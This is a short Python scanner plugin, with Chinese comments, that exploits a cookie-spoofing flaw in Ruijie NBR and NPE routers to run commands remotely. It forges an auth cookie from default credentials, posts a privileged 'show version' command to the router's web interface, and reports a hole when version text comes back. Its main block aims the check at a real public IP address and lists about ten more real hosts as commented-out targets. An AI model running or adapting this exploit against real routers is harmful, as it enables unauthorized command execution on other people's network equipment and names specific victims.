#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = LinE
#__refer__  = http://www.wooyun.org/bugs/wooyun-2010-0148657
'''
在refer中cookie欺骗漏洞的基础上发现了远程的路由命令执行
经过测试，发现锐捷的NBR NPE两个大类的路由器均存在此漏洞

'''

import urlparse
def assign(service, arg):
    if service == 'ruijie_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def base64(string):
    import base64
    return base64.b64encode(string)

def audit(arg):
    users = ['manager:manager','guest:guest']
    for user in users:
        cookie = "c_name=; hardtype=NBR1500G; web-coding=gb2312; currentURL=; auth=" + base64(user) +"; user=admin"
        posturl =  "/WEB_VMS/LEVEL15/"
        command = "show version"
        post = "command=" + command +"&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant."
        target = arg + posturl
        code, head, res, errcode, _ = curl.curl2(target,post=post, cookie=cookie)
        # print res
        if code == 200 and "System software version" in res:
                security_hole(user +" | " + arg)
                return 0 # 检测出来一个弱口令就退出

if __name__ == '__main__':
    from dummy import *
    #以下是NBR
    audit(assign('ruijie_router', 'http://218.64.115.106/')[1])
    # audit(assign('www', 'http://124.119.14.146:8088/')[1])
    # audit(assign('www', 'http://60.206.127.1:8088/')[1])
    # audit(assign('www', 'http://221.2.100.218:8188/')[1])
    # audit(assign('www', 'http://110.189.88.100:8888/')[1])
    # audit(assign('www', 'http://221.2.100.218:8188/')[1])
    # audit(assign('www', 'http://223.220.248.3/')[1])
    # audit(assign('www', 'http://110.189.88.100:8888/')[1])
    # #以下是NPE
    # audit(assign('www', 'http://www.168xbc.com/')[1])
    # audit(assign('www', 'http://www.hzwx.cn:1800/')[1])